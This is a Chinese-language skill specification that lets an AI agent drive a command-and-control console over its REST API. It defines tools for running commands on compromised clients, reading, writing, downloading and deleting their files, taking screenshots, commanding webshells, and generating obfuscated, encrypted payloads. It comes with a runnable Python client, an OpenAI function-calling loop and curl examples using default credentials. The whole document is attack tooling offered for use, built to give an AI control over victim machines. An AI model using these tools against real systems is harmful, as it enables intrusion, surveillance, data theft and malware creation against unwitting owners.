# C2 Skill 定义（AGI 智能体可直接调用）

本文档为 AGI 智能体提供完整的、可直接执行的 C2 控制台操作能力。包含鉴权流程、每个 skill 的 HTTP 调用细节，AGI 加载本文档即可独立工作，无需依赖其他文档。

---

## 服务地址

- **Base URL**：`http://<host>:<port>`（默认 `http://192.168.0.31:5000`，遵循 `config.json` 的 `web.host` + `web.port`）
- **协议**：HTTP（`config.json` 的 `web.protocol` 为 `https` 时使用 HTTPS）

---

## 鉴权流程

### 第一步：登录获取 Token

```http
POST /api/login
Content-Type: application/json

{
  "username": "admin",
  "password": "admin123"
}
```

**响应**：

```json
{
  "token": "f3cc7a48affa0f34...",
  "username": "admin",
  "role": "admin"
}
```

- Token 有效期 24 小时
- 登录限流：连续失败 5 次锁定 15 分钟
- 默认账号：`admin` / `admin123`

### 第二步：携带 Token 调用所有 API

所有后续请求必须携带 token，支持两种方式（任选其一）：

| 方式 | 格式 | 适用场景 |
|------|------|----------|
| 请求头（推荐） | `Authorization: Bearer <token>` | fetch / curl / Python requests / AGI |
| Query 参数 | `?token=<token>` | 浏览器下载（window.open） |

**鉴权失败**：HTTP 401，`{"error": "Unauthorized"}`

### 第三步：调用 Skill

每个 skill 对应一个标准 REST API 调用，下文给出完整的 HTTP 方法、路径、请求体格式。

---

## 通用响应格式

### 成功

- HTTP 状态码 200
- 响应体：JSON（具体结构见各 skill）

### 失败

- HTTP 状态码 4xx / 5xx
- 响应体：`{"error": "错误信息"}`

---

## Skill 列表（22 个）

### 1. list_clients — 列出所有客户端

列出所有受控客户端，支持按分组和类型过滤。

```json
{
  "name": "list_clients",
  "description": "列出所有客户端，支持按分组(group)和类型(type: agent/webshell)过滤。返回客户端数组，含 client_id、hostname、os、ip、status、last_seen 等字段。",
  "parameters": {
    "type": "object",
    "properties": {
      "group": { "type": "string", "description": "按分组名称过滤，留空返回全部" },
      "type": { "type": "string", "enum": ["agent", "webshell"], "description": "按客户端类型过滤" }
    }
  }
}
```

**调用方式**：

```http
GET /api/clients?group={group}&type={type}
Authorization: Bearer <token>
```

**响应**：

```json
[
  {
    "client_id": "ebf09e65c63c8367",
    "hostname": "DESKTOP-ABC",
    "os": "windows",
    "ip": "192.168.0.9",
    "status": "online",
    "last_seen": "2026-07-13 10:42:05",
    "group_name": "default",
    "client_type": "agent"
  }
]
```

---

### 2. get_client — 获取客户端详情

```json
{
  "name": "get_client",
  "description": "获取指定客户端的完整信息，包括系统信息、WebShell 配置、会话状态等。",
  "parameters": {
    "type": "object",
    "properties": {
      "client_id": { "type": "string", "description": "客户端 ID（16 位 hex）" }
    },
    "required": ["client_id"]
  }
}
```

**调用方式**：

```http
GET /api/clients/{client_id}
Authorization: Bearer <token>
```

---

### 3. delete_client — 删除客户端

```json
{
  "name": "delete_client",
  "description": "删除指定客户端及其关联的所有任务记录。不可恢复。",
  "parameters": {
    "type": "object",
    "properties": {
      "client_id": { "type": "string", "description": "客户端 ID" }
    },
    "required": ["client_id"]
  }
}
```

**调用方式**：

```http
POST /api/clients/{client_id}/delete
Authorization: Bearer <token>
```

---

### 4. exec_command — 在目标客户端执行命令

任务下发后返回 task_id，需调用 `get_task_result` 轮询结果。WS/TCP 长连接客户端实时推送（1-2 秒），HTTP 模式需等待客户端轮询（10s+）。

```json
{
  "name": "exec_command",
  "description": "在目标客户端执行系统命令（如 whoami、ipconfig、ls）。返回 task_id，需调用 get_task_result 获取执行结果。",
  "parameters": {
    "type": "object",
    "properties": {
      "client_id": { "type": "string", "description": "目标客户端 ID" },
      "cmd": { "type": "string", "description": "要执行的命令" }
    },
    "required": ["client_id", "cmd"]
  }
}
```

**调用方式**：

```http
POST /api/task/send
Authorization: Bearer <token>
Content-Type: application/json

{
  "client_ids": ["{client_id}"],
  "task_type": "cmd",
  "task_data": {"cmd": "{cmd}"}
}
```

**响应**：

```json
{
  "task_ids": [208],
  "pushed": true
}
```

- `pushed=true`：WS/TCP 长连接，任务已实时推送
- `pushed=false`：HTTP 模式，任务存数据库等待客户端轮询

---

### 5. get_task_result — 获取任务执行结果

```json
{
  "name": "get_task_result",
  "description": "获取任务执行结果。返回完整任务记录，含 status(pending/completed/failed) 和 result 字段。",
  "parameters": {
    "type": "object",
    "properties": {
      "task_id": { "type": "integer", "description": "任务 ID" }
    },
    "required": ["task_id"]
  }
}
```

**调用方式**：

```http
GET /api/task/{task_id}
Authorization: Bearer <token>
```

**响应**：

```json
{
  "id": 208,
  "client_id": "ebf09e65c63c8367",
  "task_type": "cmd",
  "status": "completed",
  "result": "desktop-abc\\user",
  "created_at": "2026-07-13 10:42:05",
  "completed_at": "2026-07-13 10:42:06"
}
```

- `status=pending`：客户端尚未执行，需继续轮询
- `status=completed`：已完成，`result` 为执行结果
- `status=failed`：执行失败

---

### 6. list_tasks — 列出任务记录

```json
{
  "name": "list_tasks",
  "description": "列出任务记录，支持按客户端和状态过滤，按创建时间倒序返回。",
  "parameters": {
    "type": "object",
    "properties": {
      "client_id": { "type": "string", "description": "按客户端 ID 过滤" },
      "status": { "type": "string", "enum": ["pending", "completed", "failed"], "description": "按状态过滤" }
    }
  }
}
```

**调用方式**：

```http
GET /api/tasks?client_id={client_id}&status={status}
Authorization: Bearer <token>
```

---

### 7. list_files — 列出目标客户端目录

返回 task_id，需调用 `get_task_result` 获取结果。

```json
{
  "name": "list_files",
  "description": "列出目标客户端指定目录下的文件和子目录。返回 task_id，结果在 get_task_result 的 result 字段中。",
  "parameters": {
    "type": "object",
    "properties": {
      "client_id": { "type": "string", "description": "目标客户端 ID" },
      "path": { "type": "string", "description": "目录路径，如 C:\\ 或 /tmp/" }
    },
    "required": ["client_id", "path"]
  }
}
```

**调用方式**：

```http
POST /api/task/send
Authorization: Bearer <token>
Content-Type: application/json

{
  "client_ids": ["{client_id}"],
  "task_type": "file_list",
  "task_data": {"path": "{path}"}
}
```

---

### 8. read_file — 读取目标客户端文件

返回 task_id，结果为 base64 编码的文件内容。

```json
{
  "name": "read_file",
  "description": "读取目标客户端上的文件内容。返回 task_id，结果在 get_task_result 的 result 字段中（base64 编码）。",
  "parameters": {
    "type": "object",
    "properties": {
      "client_id": { "type": "string", "description": "目标客户端 ID" },
      "path": { "type": "string", "description": "文件完整路径" }
    },
    "required": ["client_id", "path"]
  }
}
```

**调用方式**：

```http
POST /api/task/send
Authorization: Bearer <token>
Content-Type: application/json

{
  "client_ids": ["{client_id}"],
  "task_type": "file_view",
  "task_data": {"path": "{path}"}
}
```

---

### 9. write_file — 写入文件到目标客户端

```json
{
  "name": "write_file",
  "description": "将文件内容写入目标客户端的指定路径。content 参数为 base64 编码的文件内容。",
  "parameters": {
    "type": "object",
    "properties": {
      "client_id": { "type": "string", "description": "目标客户端 ID" },
      "path": { "type": "string", "description": "文件完整路径" },
      "content": { "type": "string", "description": "文件内容（base64 编码）" }
    },
    "required": ["client_id", "path", "content"]
  }
}
```

**调用方式**：

```http
POST /api/task/send
Authorization: Bearer <token>
Content-Type: application/json

{
  "client_ids": ["{client_id}"],
  "task_type": "file_save",
  "task_data": {
    "path": "{path}",
    "content": "{base64_content}"
  }
}
```

---

### 10. download_file — 从目标客户端下载文件

返回 task_id，完成后在 `get_task_result` 的 `result` 字段获取服务端文件路径。

```json
{
  "name": "download_file",
  "description": "从目标客户端下载指定文件到服务端。返回 task_id，完成后可在 get_task_result 中获取文件路径。",
  "parameters": {
    "type": "object",
    "properties": {
      "client_id": { "type": "string", "description": "目标客户端 ID" },
      "path": { "type": "string", "description": "目标客户端上的文件路径" }
    },
    "required": ["client_id", "path"]
  }
}
```

**调用方式**：

```http
POST /api/task/send
Authorization: Bearer <token>
Content-Type: application/json

{
  "client_ids": ["{client_id}"],
  "task_type": "file_download",
  "task_data": {"path": "{path}"}
}
```

---

### 11. delete_file — 删除目标客户端文件

```json
{
  "name": "delete_file",
  "description": "删除目标客户端上的指定文件。不可恢复。",
  "parameters": {
    "type": "object",
    "properties": {
      "client_id": { "type": "string", "description": "目标客户端 ID" },
      "path": { "type": "string", "description": "要删除的文件路径" }
    },
    "required": ["client_id", "path"]
  }
}
```

**调用方式**：

```http
POST /api/task/send
Authorization: Bearer <token>
Content-Type: application/json

{
  "client_ids": ["{client_id}"],
  "task_type": "file_delete",
  "task_data": {"path": "{path}"}
}
```

---

### 12. screenshot — 对目标客户端截图

返回 task_id，完成后 `get_task_result` 的 `result` 字段含截图文件路径。

```json
{
  "name": "screenshot",
  "description": "对目标客户端进行屏幕截图。返回 task_id，完成后 get_task_result 的 result 字段含截图文件路径。",
  "parameters": {
    "type": "object",
    "properties": {
      "client_id": { "type": "string", "description": "目标客户端 ID" }
    },
    "required": ["client_id"]
  }
}
```

**调用方式**：

```http
POST /api/task/send
Authorization: Bearer <token>
Content-Type: application/json

{
  "client_ids": ["{client_id}"],
  "task_type": "screenshot",
  "task_data": {}
}
```

---

### 13. list_webshells — 列出所有 WebShell

```json
{
  "name": "list_webshells",
  "description": "列出所有已添加的 WebShell 客户端记录，含 URL、加密算法、备注等。",
  "parameters": {
    "type": "object",
    "properties": {}
  }
}
```

**调用方式**：

```http
GET /api/webshell/list
Authorization: Bearer <token>
```

---

### 14. add_webshell — 添加 WebShell

```json
{
  "name": "add_webshell",
  "description": "添加一个 WebShell 到管理列表。添加后可通过 webshell_exec 执行命令。",
  "parameters": {
    "type": "object",
    "properties": {
      "url": { "type": "string", "description": "WebShell 的 URL 地址" },
      "enc_algo": { "type": "string", "description": "加密算法（aes-128-cbc/aes-256-cbc/chacha20/rc4/none）", "default": "aes-128-cbc" },
      "enc_password": { "type": "string", "description": "加密密码", "default": "C2DemoKey2024!!!" },
      "remark": { "type": "string", "description": "备注信息" }
    },
    "required": ["url"]
  }
}
```

**调用方式**：

```http
POST /api/webshell/add
Authorization: Bearer <token>
Content-Type: application/json

{
  "url": "http://target/shell.php",
  "enc_algo": "aes-128-cbc",
  "enc_password": "C2DemoKey2024!!!",
  "remark": "目标 Web 服务器"
}
```

---

### 15. webshell_exec — 在 WebShell 上执行命令

**即时型 skill**，WebShell 为同步请求-响应模式，直接返回命令输出，无需轮询。

```json
{
  "name": "webshell_exec",
  "description": "在指定 WebShell 上执行命令。与 exec_command 不同，WebShell 为同步请求-响应模式，直接返回命令输出。",
  "parameters": {
    "type": "object",
    "properties": {
      "client_id": { "type": "string", "description": "WebShell 客户端 ID" },
      "cmd": { "type": "string", "description": "要执行的命令" }
    },
    "required": ["client_id", "cmd"]
  }
}
```

**调用方式**：

```http
POST /api/webshell/{client_id}/exec
Authorization: Bearer <token>
Content-Type: application/json

{
  "action": "cmd",
  "param": {"cmd": "{cmd}"}
}
```

**响应**：

```json
{
  "output": "root\n"
}
```

---

### 16. webshell_list_files — 列出 WebShell 目录

**即时型 skill**，同步返回结果。

```json
{
  "name": "webshell_list_files",
  "description": "列出 WebShell 服务器上指定目录的文件列表。同步返回结果。",
  "parameters": {
    "type": "object",
    "properties": {
      "client_id": { "type": "string", "description": "WebShell 客户端 ID" },
      "path": { "type": "string", "description": "目录路径", "default": "/" }
    },
    "required": ["client_id"]
  }
}
```

**调用方式**：

```http
POST /api/webshell/{client_id}/exec
Authorization: Bearer <token>
Content-Type: application/json

{
  "action": "file_list",
  "param": {"path": "{path}"}
}
```

---

### 17. webshell_read_file — 读取 WebShell 文件

**即时型 skill**，同步返回结果。

```json
{
  "name": "webshell_read_file",
  "description": "读取 WebShell 服务器上的文件内容。同步返回结果。",
  "parameters": {
    "type": "object",
    "properties": {
      "client_id": { "type": "string", "description": "WebShell 客户端 ID" },
      "path": { "type": "string", "description": "文件路径" }
    },
    "required": ["client_id", "path"]
  }
}
```

**调用方式**：

```http
POST /api/webshell/{client_id}/exec
Authorization: Bearer <token>
Content-Type: application/json

{
  "action": "file_view",
  "param": {"path": "{path}"}
}
```

---

### 18. list_payloads — 列出所有 Payload

```json
{
  "name": "list_payloads",
  "description": "列出所有已生成的 Payload 记录，含文件名、类型、加密算法、创建时间等。",
  "parameters": {
    "type": "object",
    "properties": {}
  }
}
```

**调用方式**：

```http
GET /api/payloads
Authorization: Bearer <token>
```

---

### 19. generate_payload — 生成 Payload

```json
{
  "name": "generate_payload",
  "description": "生成新的 Payload。支持选择通信协议（http/websocket/tcp）、加密算法、混淆级别。生成的文件保存在 payloads/ 目录。",
  "parameters": {
    "type": "object",
    "properties": {
      "name": { "type": "string", "description": "Payload 名称", "default": "skill_payload" },
      "os": { "type": "string", "description": "目标系统（windows/linux）", "default": "windows" },
      "arch": { "type": "string", "description": "架构（amd64/386）", "default": "amd64" },
      "format": { "type": "string", "description": "输出格式（exe/shellcode/ps1/bat/sh/py）", "default": "exe" },
      "protocol": { "type": "string", "enum": ["http", "websocket", "tcp"], "description": "通信协议", "default": "websocket" },
      "encryption": { "type": "string", "description": "加密算法（aes-128-cbc/aes-256-cbc/chacha20/rc4/xor/none）", "default": "aes-128-cbc" },
      "enc_password": { "type": "string", "description": "加密密码", "default": "C2DemoKey2024!!!" },
      "obf_level": { "type": "string", "enum": ["none", "low", "medium", "high"], "description": "混淆级别", "default": "high" }
    }
  }
}
```

**调用方式**：

```http
POST /api/payload/generate
Authorization: Bearer <token>
Content-Type: application/json

{
  "name": "skill_payload",
  "os": "windows",
  "arch": "amd64",
  "format": "exe",
  "protocol": "websocket",
  "encryption": "aes-128-cbc",
  "enc_password": "C2DemoKey2024!!!",
  "obf_level": "high"
}
```

**响应**：

```json
{
  "filename": "skill_payload.exe",
  "protocol": "websocket",
  "encryption": "aes-128-cbc"
}
```

---

### 20. get_stats — 获取仪表盘统计

```json
{
  "name": "get_stats",
  "description": "获取控制台仪表盘统计数据，包括在线/离线客户端数、任务状态分布、日志总数。",
  "parameters": {
    "type": "object",
    "properties": {}
  }
}
```

**调用方式**：

```http
GET /api/dashboard/stats
Authorization: Bearer <token>
```

---

### 21. list_logs — 列出日志

```json
{
  "name": "list_logs",
  "description": "列出操作日志记录，支持按类型过滤。",
  "parameters": {
    "type": "object",
    "properties": {
      "type": { "type": "string", "description": "日志类型过滤（login/settings/client/payload/task 等）" },
      "limit": { "type": "integer", "description": "返回条数", "default": 50 }
    }
  }
}
```

**调用方式**：

```http
GET /api/logs?type={type}&page_size={limit}
Authorization: Bearer <token>
```

---

### 22. get_settings — 获取系统配置

```json
{
  "name": "get_settings",
  "description": "获取当前系统所有配置项，包括监听地址、加密配置、客户端行为参数、安全策略等。",
  "parameters": {
    "type": "object",
    "properties": {}
  }
}
```

**调用方式**：

```http
GET /api/settings
Authorization: Bearer <token>
```

---

## AGI 集成完整示例

### Python（自包含，可直接运行）

```python
import requests
import time
import base64

BASE = "http://192.168.0.31:5000"

class C2Client:
    def __init__(self, base_url, username="admin", password="admin123"):
        self.base = base_url
        resp = requests.post(f"{base_url}/api/login",
                            json={"username": username, "password": password})
        self.token = resp.json()["token"]
        self.headers = {"Authorization": f"Bearer {self.token}",
                        "Content-Type": "application/json"}

    # === Skill 1: list_clients ===
    def list_clients(self, group="", client_type=""):
        params = {}
        if group: params["group"] = group
        if client_type: params["type"] = client_type
        return requests.get(f"{self.base}/api/clients",
                           headers=self.headers, params=params).json()

    # === Skill 2: get_client ===
    def get_client(self, client_id):
        return requests.get(f"{self.base}/api/clients/{client_id}",
                           headers=self.headers).json()

    # === Skill 3: delete_client ===
    def delete_client(self, client_id):
        return requests.post(f"{self.base}/api/clients/{client_id}/delete",
                            headers=self.headers).json()

    # === Skill 4: exec_command ===
    def exec_command(self, client_id, cmd):
        resp = requests.post(f"{self.base}/api/task/send", headers=self.headers, json={
            "client_ids": [client_id],
            "task_type": "cmd",
            "task_data": {"cmd": cmd}
        })
        return resp.json()

    # === Skill 5: get_task_result ===
    def get_task_result(self, task_id):
        return requests.get(f"{self.base}/api/task/{task_id}",
                           headers=self.headers).json()

    # === Skill 6: list_tasks ===
    def list_tasks(self, client_id="", status=""):
        params = {}
        if client_id: params["client_id"] = client_id
        if status: params["status"] = status
        return requests.get(f"{self.base}/api/tasks",
                           headers=self.headers, params=params).json()

    # === Skill 7-11: 文件操作（通过 task/send 下发）===
    def list_files(self, client_id, path):
        return self._send_task(client_id, "file_list", {"path": path})

    def read_file(self, client_id, path):
        return self._send_task(client_id, "file_view", {"path": path})

    def write_file(self, client_id, path, content):
        # content 为原始文本，自动 base64 编码
        b64 = base64.b64encode(content.encode()).decode()
        return self._send_task(client_id, "file_save", {"path": path, "content": b64})

    def download_file(self, client_id, path):
        return self._send_task(client_id, "file_download", {"path": path})

    def delete_file(self, client_id, path):
        return self._send_task(client_id, "file_delete", {"path": path})

    # === Skill 12: screenshot ===
    def screenshot(self, client_id):
        return self._send_task(client_id, "screenshot", {})

    # === Skill 13: list_webshells ===
    def list_webshells(self):
        return requests.get(f"{self.base}/api/webshell/list",
                           headers=self.headers).json()

    # === Skill 14: add_webshell ===
    def add_webshell(self, url, enc_algo="aes-128-cbc",
                     enc_password="C2DemoKey2024!!!", remark=""):
        return requests.post(f"{self.base}/api/webshell/add", headers=self.headers, json={
            "url": url, "enc_algo": enc_algo,
            "enc_password": enc_password, "remark": remark
        }).json()

    # === Skill 15-17: WebShell 操作（即时返回）===
    def webshell_exec(self, client_id, cmd):
        return requests.post(f"{self.base}/api/webshell/{client_id}/exec",
                            headers=self.headers,
                            json={"action": "cmd", "param": {"cmd": cmd}}).json()

    def webshell_list_files(self, client_id, path="/"):
        return requests.post(f"{self.base}/api/webshell/{client_id}/exec",
                            headers=self.headers,
                            json={"action": "file_list", "param": {"path": path}}).json()

    def webshell_read_file(self, client_id, path):
        return requests.post(f"{self.base}/api/webshell/{client_id}/exec",
                            headers=self.headers,
                            json={"action": "file_view", "param": {"path": path}}).json()

    # === Skill 18-19: Payload ===
    def list_payloads(self):
        return requests.get(f"{self.base}/api/payloads", headers=self.headers).json()

    def generate_payload(self, name="skill_payload", os="windows", arch="amd64",
                         format="exe", protocol="websocket", encryption="aes-128-cbc",
                         enc_password="C2DemoKey2024!!!", obf_level="high"):
        return requests.post(f"{self.base}/api/payload/generate", headers=self.headers, json={
            "name": name, "os": os, "arch": arch, "format": format,
            "protocol": protocol, "encryption": encryption,
            "enc_password": enc_password, "obf_level": obf_level
        }).json()

    # === Skill 20-22: 统计/日志/配置 ===
    def get_stats(self):
        return requests.get(f"{self.base}/api/dashboard/stats",
                           headers=self.headers).json()

    def list_logs(self, log_type="", limit=50):
        params = {"page_size": limit}
        if log_type: params["type"] = log_type
        return requests.get(f"{self.base}/api/logs",
                           headers=self.headers, params=params).json()

    def get_settings(self):
        return requests.get(f"{self.base}/api/settings", headers=self.headers).json()

    # === 辅助：等待任务完成 ===
    def wait_task(self, task_id, timeout=30):
        """轮询任务结果，直到 completed/failed 或超时"""
        for _ in range(timeout):
            task = self.get_task_result(task_id)
            if task.get("status") in ("completed", "failed"):
                return task
            time.sleep(1)
        return {"error": "timeout", "task_id": task_id}

    def _send_task(self, client_id, task_type, task_data):
        return requests.post(f"{self.base}/api/task/send", headers=self.headers, json={
            "client_ids": [client_id],
            "task_type": task_type,
            "task_data": task_data
        }).json()


# ============ 使用示例 ============
if __name__ == "__main__":
    c2 = C2Client("http://192.168.0.31:5000")

    # 1. 列出所有在线客户端
    clients = c2.list_clients()
    for c in clients:
        print(f"{c['client_id']}  {c['hostname']}  {c['status']}")

    # 2. 在第一个客户端执行命令并等待结果
    if clients:
        cid = clients[0]["client_id"]
        resp = c2.exec_command(cid, "whoami")
        task_id = resp["task_ids"][0]
        result = c2.wait_task(task_id, timeout=10)
        print(f"whoami 结果: {result.get('result')}")

        # 3. 列出 C 盘目录
        resp = c2.list_files(cid, "C:\\")
        task_id = resp["task_ids"][0]
        result = c2.wait_task(task_id, timeout=10)
        print(f"目录列表: {result.get('result')}")

    # 4. 生成新的 payload
    payload = c2.generate_payload(name="test", protocol="websocket",
                                  encryption="chacha20")
    print(f"生成 payload: {payload}")
```

### OpenAI Function Calling

```python
import openai
import requests
import json

BASE = "http://192.168.0.31:5000"
token = requests.post(f"{BASE}/api/login",
                     json={"username": "admin", "password": "admin123"}).json()["token"]
headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

# 工具定义（从 skill.md 的 JSON Schema 复制）
tools = [
    {
        "type": "function",
        "function": {
            "name": "list_clients",
            "description": "列出所有客户端，支持按分组和类型过滤",
            "parameters": {
                "type": "object",
                "properties": {
                    "group": {"type": "string"},
                    "type": {"type": "string", "enum": ["agent", "webshell"]}
                }
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "exec_command",
            "description": "在目标客户端执行系统命令，返回 task_id",
            "parameters": {
                "type": "object",
                "properties": {
                    "client_id": {"type": "string"},
                    "cmd": {"type": "string"}
                },
                "required": ["client_id", "cmd"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "get_task_result",
            "description": "获取任务执行结果",
            "parameters": {
                "type": "object",
                "properties": {"task_id": {"type": "integer"}},
                "required": ["task_id"]
            }
        }
    }
    # ... 其他 skill 同样格式
]

# 执行工具的 dispatcher
def execute_tool(name, args):
    if name == "list_clients":
        params = {}
        if args.get("group"): params["group"] = args["group"]
        if args.get("type"): params["type"] = args["type"]
        return requests.get(f"{BASE}/api/clients", headers=headers, params=params).json()
    elif name == "exec_command":
        return requests.post(f"{BASE}/api/task/send", headers=headers, json={
            "client_ids": [args["client_id"]],
            "task_type": "cmd",
            "task_data": {"cmd": args["cmd"]}
        }).json()
    elif name == "get_task_result":
        return requests.get(f"{BASE}/api/task/{args['task_id']}", headers=headers).json()

# AGI 对话循环
messages = [{"role": "user", "content": "列出所有在线客户端并在第一个客户端执行 whoami"}]
response = openai.chat.completions.create(model="gpt-4", messages=messages, tools=tools)

while response.choices[0].message.tool_calls:
    messages.append(response.choices[0].message)
    for tool_call in response.choices[0].message.tool_calls:
        args = json.loads(tool_call.function.arguments)
        result = execute_tool(tool_call.function.name, args)
        messages.append({
            "role": "tool",
            "tool_call_id": tool_call.id,
            "content": json.dumps(result, ensure_ascii=False)
        })
    response = openai.chat.completions.create(model="gpt-4", messages=messages, tools=tools)

print(response.choices[0].message.content)
```

---

## 关键注意事项

### 1. 任务型 vs 即时型 skill

| 类型 | skill | 行为 |
|------|-------|------|
| **任务型** | exec_command, list_files, read_file, write_file, download_file, delete_file, screenshot | 通过 `POST /api/task/send` 下发，返回 `task_id`，需调用 `get_task_result`（`GET /api/task/{task_id}`）轮询结果 |
| **即时型** | list_clients, get_client, delete_client, list_webshells, add_webshell, webshell_exec, webshell_list_files, webshell_read_file, list_payloads, generate_payload, get_stats, list_logs, get_settings, list_tasks | 直接返回结果，无需轮询 |

### 2. 长连接 vs HTTP 模式响应速度

- **WS/TCP 长连接客户端**：`exec_command` 响应中 `pushed=true`，任务实时推送，结果通常 1-2 秒内可查
- **HTTP 模式客户端**：`pushed=false`，任务存数据库等待客户端轮询（10s+），结果需等待 10-15 秒

### 3. client_id 获取

调用任何需要 `client_id` 的 skill 前，先调用 `list_clients`（`GET /api/clients`）获取所有客户端的 `client_id`。

### 4. 文件内容编码

`write_file` 的 `content` 参数必须为 **base64 编码**的文件内容：

```python
import base64
content_b64 = base64.b64encode("文件内容".encode()).decode()
```

### 5. curl 调用示例

```bash
# 登录获取 token
TOKEN=$(curl -s -X POST http://192.168.0.31:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}' | jq -r '.token')

# 列出客户端
curl -s http://192.168.0.31:5000/api/clients \
  -H "Authorization: Bearer $TOKEN"

# 执行命令
curl -s -X POST http://192.168.0.31:5000/api/task/send \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"client_ids":["ebf09e65c63c8367"],"task_type":"cmd","task_data":{"cmd":"whoami"}}'

# 查询任务结果
curl -s http://192.168.0.31:5000/api/task/208 \
  -H "Authorization: Bearer $TOKEN"
```
